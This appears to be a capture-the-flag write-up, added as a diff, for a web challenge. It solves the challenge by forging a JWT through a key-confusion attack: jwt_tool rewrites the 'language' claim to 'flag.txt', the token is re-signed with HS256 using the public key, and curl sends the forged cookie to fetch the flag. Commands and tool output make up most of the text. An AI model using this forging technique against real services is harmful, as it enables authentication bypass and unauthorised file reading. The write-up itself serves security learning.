@@ -1,0 +1,49 @@
+Because of `language.match(languageRegex)`, we cannot leak flag.txt or key.priv. But we can leak key.
+
+Forgeable Public/Private Tokens
+	https://snyk.io/test/npm/jsonwebtoken/3.2.2
+
+For older version PyJwt
+	python3 -m pip install pyjwt==0.4.3
+
+python3 exp.py
+```
+bcactf{je_suis_desole_jai_utilise_google_translate_beaucoup_dfW78ertjk}
+```
+
+
+============= Using jwt_tool =============
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZyZW5jaCIsImlhdCI6MTYyMzY4NDk5N30.c0cpP5MJzJHcurzHv2tgpMTPfl9RQ0udeveTbFDk40OJvCQllXnia5nzoOTPgEgDrBjvj2lXYKCny_lEthPnFavPxIBslbKTFKwHf62fiWB5UBrf-WLpv3m4R977YNHqpy-Fo41bL5DoIFvarVTXpuo7fEVGJOuZx4DwqYM8ks0
+```
+{
+  "typ": "JWT",
+  "alg": "RS256"
+}
+{
+  "language": "french",
+  "iat": 1623684997
+}
+```
+
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZyZW5jaCIsImlhdCI6MTYyMzY4NDk5N30.c0cpP5MJzJHcurzHv2tgpMTPfl9RQ0udeveTbFDk40OJvCQllXnia5nzoOTPgEgDrBjvj2lXYKCny_lEthPnFavPxIBslbKTFKwHf62fiWB5UBrf-WLpv3m4R977YNHqpy-Fo41bL5DoIFvarVTXpuo7fEVGJOuZx4DwqYM8ks0 -T
+```
+language = "flag.txt"
+
+Signature unchanged - no signing method specified (-S or -X)
+jwttool_2d85bc89b749af2e25d9f6010d58a96f - Tampered token:
+[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjg0OTk3fQ.c0cpP5MJzJHcurzHv2tgpMTPfl9RQ0udeveTbFDk40OJvCQllXnia5nzoOTPgEgDrBjvj2lXYKCny_lEthPnFavPxIBslbKTFKwHf62fiWB5UBrf-WLpv3m4R977YNHqpy-Fo41bL5DoIFvarVTXpuo7fEVGJOuZx4DwqYM8ks0
+```
+
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjg0OTk3fQ.c0cpP5MJzJHcurzHv2tgpMTPfl9RQ0udeveTbFDk40OJvCQllXnia5nzoOTPgEgDrBjvj2lXYKCny_lEthPnFavPxIBslbKTFKwHf62fiWB5UBrf-WLpv3m4R977YNHqpy-Fo41bL5DoIFvarVTXpuo7fEVGJOuZx4DwqYM8ks0 -X k -pk /home/lai/leo/bcactf/web/poll/key
+```
+File loaded: /home/lai/leo/bcactf/web/poll/key
+jwttool_bf86e6abdd3caa31bc8e414ea3f54b89 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
+(This will only be valid on unpatched implementations of JWT.)
+[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjg0OTk3fQ.BsFnmH_gFB9D0Vj32vbixCzIvFEkMWWbY3Ig0xZahqM
+```
+
+curl http://web.bcactf.com:49159/localisation-file --cookie "lion-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIzNjg0OTk3fQ.BsFnmH_gFB9D0Vj32vbixCzIvFEkMWWbY3Ig0xZahqM"
+```
+bcactf{je_suis_desole_jai_utilise_google_translate_beaucoup_dfW78ertjk}
+```
